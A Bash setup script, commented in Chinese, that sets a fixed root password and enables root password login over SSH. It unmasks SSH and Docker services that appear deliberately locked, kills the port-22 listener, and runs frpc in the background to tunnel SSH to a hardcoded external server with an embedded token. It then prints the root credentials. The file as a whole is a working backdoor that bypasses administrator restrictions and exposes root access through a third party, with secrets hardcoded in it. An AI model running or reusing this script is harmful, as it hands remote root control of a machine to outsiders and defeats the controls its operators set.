#!/usr/bin/env bash

# 定义颜色
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
RESET="\033[0m"

# 检测 root 权限
[[ $EUID -ne 0 ]] && echo -e "${RED}错误: 请先运行 sudo -i 获取 root 权限后再执行此脚本${RESET}" && exit 1

# 固定密码
PASSWORD="lkjhgdsa1"

# 解锁 SSH 和 Docker 服务
unlock_services() {
  echo -e "${YELLOW}[2/4] 正在解除 SSH 和 Docker 服务的锁定...${RESET}"
  systemctl unmask ssh 2>/dev/null || true
  systemctl start ssh 2>/dev/null || true
  systemctl unmask containerd docker.socket docker 2>/dev/null || true
  pkill dockerd 2>/dev/null || true
  pkill containerd 2>/dev/null || true
  systemctl start containerd docker.socket docker 2>/dev/null || true
  sleep 2
}

# SSH 配置
configure_ssh() {
  echo -e "${YELLOW}[1/4] 正在配置 SSH 服务...${RESET}"
  lsof -i:22 | awk '/IPv4/{print $2}' | xargs kill -9 2>/dev/null || true
  sed -i 's/^#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config
  sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config
  echo root:$PASSWORD | chpasswd
  systemctl restart ssh
}

# 一键配置
echo -e "${GREEN}===== 正在执行一键 FRP 配置 =====${RESET}"

# 固定 FRP 参数
FRP_SERVER="152.70.242.191"
FRP_PORT=5443
FRP_TOKEN="14j0FvrWU3sinn94"
FRP_REMOTE_PORT=6000

configure_ssh
unlock_services

echo -e "${YELLOW}[3/4] 正在下载并配置 frpc 客户端...${RESET}"
FRP_URL=$(wget -qO- https://api.github.com/repos/fatedier/frp/releases/latest | grep 'browser_download_url.*linux_amd64' | cut -d '"' -f 4)
wget -qO- $FRP_URL | tar xz
mv frp_*/frpc /usr/local/bin/
rm -rf frp_*

mkdir -p /etc/frp
cat > /etc/frp/frpc.toml << EOF
serverAddr = "${FRP_SERVER}"
serverPort = ${FRP_PORT}
loginFailExit = false

auth.method = "token"
auth.token = "${FRP_TOKEN}"

transport.heartbeatInterval = 10
transport.heartbeatTimeout = 30
transport.dialServerKeepalive = 10
transport.dialServerTimeout = 30
transport.tcpMuxKeepaliveInterval = 10
transport.poolCount = 5

[[proxies]]
name = "$(hostname)"
type = "tcp"
localIP = "127.0.0.1"
localPort = 22
remotePort = ${FRP_REMOTE_PORT}
EOF

pkill -f "frpc -c /etc/frp/frpc.toml" >/dev/null 2>&1 || true
nohup /usr/local/bin/frpc -c /etc/frp/frpc.toml >/dev/null 2>&1 &

echo -e "${GREEN}===== 设置完成 =====${RESET}"
echo ""
echo -e "${GREEN}SSH 地址: ${RESET}${FRP_SERVER}"
echo -e "${GREEN}SSH 端口: ${RESET}${FRP_REMOTE_PORT}"
echo -e "${GREEN}SSH 用户: ${RESET}root"
echo -e "${GREEN}SSH 密码: ${RESET}${PASSWORD}"
echo ""
echo -e "${GREEN}连接命令:${RESET} ssh root@${FRP_SERVER} -p ${FRP_REMOTE_PORT}"
echo ""
echo -e "${YELLOW}注意: 如需停止 frpc，请执行: ${RESET}pkill -f frpc"
